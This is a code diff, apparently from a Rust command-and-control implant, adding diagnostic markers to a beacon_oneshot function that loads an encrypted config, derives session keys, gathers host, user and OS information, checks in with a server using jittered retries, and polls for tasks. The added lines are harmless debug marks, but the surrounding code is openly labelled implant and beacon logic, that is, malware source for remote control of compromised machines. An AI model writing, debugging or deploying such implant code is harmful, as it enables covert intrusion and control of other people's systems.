@@ -252,10 +252,12 @@ pub unsafe fn beacon_oneshot() -> u32 {
         };
     crate::mem::register_owned(config_plain);
     // DIAG step 1: config loaded OK
+    crate::entry::diag_mark(b"b1_config");
 
     // Initialize channel dispatcher (same as beacon_loop).
     let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
     crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
+    crate::entry::diag_mark(b"b2_channel");
 
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
         ImplantKeypair::from_secret_bytes(*priv_bytes)
@@ -269,8 +271,10 @@ pub unsafe fn beacon_oneshot() -> u32 {
         }
     };
     // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
+    crate::entry::diag_mark(b"b3_keygen");
     let key = kp.session_key(&cfg.server_pub);
     // DIAG step 3: session_key (HKDF) done
+    crate::entry::diag_mark(b"b4_skey");
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
@@ -289,6 +293,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         .expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
     let info_plain = info_writer.into_bytes();
     let rt = crate::syscalls::global();
+    crate::entry::diag_mark(b"b5_info");
 
     // ---- check-in (retry up to ~30s) ----
     let mut counter = 0u64;
@@ -296,6 +301,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
     for _ in 0..10 {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
+        crate::entry::diag_mark(b"b6_send");
         if unsafe {
             crate::channels::dispatch_send_recv(
                 &ch_ctx,
@@ -306,6 +312,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         .is_some()
         {
             checked_in = true;
+            crate::entry::diag_mark(b"b7_sent");
             break;
         }
         sleep_jitter(3, 0);
@@ -327,6 +334,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
             &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
         );
         counter += 1;
+        crate::entry::diag_mark(b"b8_poll");
         let body = unsafe {
             crate::channels::dispatch_send_recv(
                 &ch_ctx,
